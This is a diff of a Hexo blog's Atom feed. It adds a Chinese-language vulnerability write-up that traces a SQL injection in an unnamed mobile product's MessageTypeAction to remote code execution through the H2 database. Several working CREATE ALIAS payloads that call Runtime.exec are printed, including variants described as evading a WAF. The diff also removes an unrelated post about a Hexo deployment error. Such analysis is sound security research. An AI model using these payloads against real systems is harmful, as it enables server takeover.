@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://x-f1v3.github.io/"/>
-  <updated>2020-11-29T08:59:23.025Z</updated>
+  <updated>2021-04-16T01:34:14.253Z</updated>
   <id>http://x-f1v3.github.io/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>某mobile RCE分析</title>
+    <link href="http://x-f1v3.github.io//blog/1618536577650.html"/>
+    <id>http://x-f1v3.github.io//blog/1618536577650.html</id>
+    <published>2021-04-16T01:29:37.000Z</published>
+    <updated>2021-04-16T01:34:14.253Z</updated>
+    
+    <content type="html"><![CDATA[<p>原本是个SQL注入,因为后端是H2数据库，所以最后能够通过执行代码达到RCE的效果。<br><a id="more"></a></p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>注入点就比较常规了，在 <code>MessageTypeAction</code>类中的 <code>messageType</code> 方法：</p><p><img src="http://x-f1v3.github.io/images/1618536657378.png" alt="image"></p><p>传入 <code>typeName</code> 参数，然后进入 <code>this.mobileService.getMessageTypeList</code> 方法，跟进该方法，发现直接带入了 SQL 语句造成了注入漏洞：<br><img src="http://x-f1v3.github.io/images/1618536680731.png" alt="image"></p><h2 id="H2-RCE"><a href="#H2-RCE" class="headerlink" title="H2 RCE"></a>H2 RCE</h2><p>因为后端使用 H2 数据库，所以可以利用h2数据库的 <code>CREATE ALIAS</code> 创建一个 java 函数然后调用它.<br><img src="http://x-f1v3.github.io/images/1618536689059.png" alt="image"></p><p>按照官方文档照这抄一个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE ALIAS EXEC AS </span><br><span class="line">$$ void e(String cmd) throws java.io.IOException </span><br><span class="line">&#123;java.lang.Runtime rt= java.lang.Runtime.getRuntime();rt.exec(cmd);&#125;$$;</span><br><span class="line"></span><br><span class="line">CALL EXEC(&apos;whoami&apos;);</span><br></pre></td></tr></table></figure></p><p>其中2个 <code>$$</code> 貌似是java代码的分隔符，由于 <code>CREATE ALIAS</code> 指令可以使用字符串作为java代码，所以完全可以变形为这样，输入单双引号作为分割：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE ALIAS EXEC1 AS &apos;String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream());  if (s.hasNext()) &#123;return s.next();&#125; throw new IllegalArgumentException();&#125;&apos;; </span><br><span class="line"></span><br><span class="line">CALL EXEC1(&apos;whoami&apos;);</span><br></pre></td></tr></table></figure></p><p>当然也可以使用 <code>CONCAT</code> 这样的内置函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE ALIAS EXEC AS CONCAT(&apos;void e(String cmd) throws java.io.IOException&apos;,</span><br><span class="line">HEXTORAW(&apos;007b&apos;),&apos;java.lang.Runtime rt= java.lang.Runtime.getRuntime();</span><br><span class="line">rt.exec(cmd);&apos;,HEXTORAW(&apos;007d&apos;));</span><br><span class="line">CALL EXEC(&apos;whoami&apos;);</span><br></pre></td></tr></table></figure></p><p>用字符串类型的语句就可以很轻松的绕过 waf,效果更好。</p><p>最终的 payload 不用多说，因为 H2 支持堆叠，所以在注入点后面加上即可。</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;原本是个SQL注入,因为后端是H2数据库，所以最后能够通过执行代码达到RCE的效果。&lt;br&gt;
+    
+    </summary>
+    
+      <category term="漏洞分析" scheme="http://x-f1v3.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+    
+    
+      <category term="Java" scheme="http://x-f1v3.github.io/tags/Java/"/>
+    
+      <category term="漏洞" scheme="http://x-f1v3.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
+    
+  </entry>
   
   <entry>
     <title>JNDI、RMI、JRMP、JMX</title>
@@ -480,28 +504,6 @@
     
     
       <category term="Wireshark" scheme="http://x-f1v3.github.io/tags/Wireshark/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>ERROR Deployer not found: git hexo d 报错</title>
-    <link href="http://x-f1v3.github.io//blog/1505536580617.html"/>
-    <id>http://x-f1v3.github.io//blog/1505536580617.html</id>
-    <published>2017-09-16T04:36:20.000Z</published>
-    <updated>2019-06-13T05:38:04.211Z</updated>
-    
-    <content type="html"><![CDATA[<p>刚搭建hexo的时候执行<code>hexo d</code>，总是会报错：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR Deployer not found: git</span><br></pre></td></tr></table></figure></p><a id="more"></a><p>网上查了之后，大多都说是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save </span><br><span class="line">重新 deploy 即可</span><br></pre></td></tr></table></figure></p><p>最后也是照做了，但是还是报同样的错误，最后想是把这些文件都给删了，重新来一次<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo init yourfolder</span><br><span class="line">cd yourfolder</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure></p><p>当然好了之后，就要修改自己的<code>_config.yml</code>文件，然后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure></p><p>居然莫名其妙的成功了，看来网上说的<code>npm install hexo-deployer-git --save</code> 也是正确方法，只不过，文件被我各种尝试给搞乱了，重新来一次就可以了。</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;刚搭建hexo的时候执行&lt;code&gt;hexo d&lt;/code&gt;，总是会报错：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;ERROR Deployer not found: git&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="解决报错" scheme="http://x-f1v3.github.io/categories/%E8%A7%A3%E5%86%B3%E6%8A%A5%E9%94%99/"/>
-    
-    
-      <category term="Hexo" scheme="http://x-f1v3.github.io/tags/Hexo/"/>
     
   </entry>
   
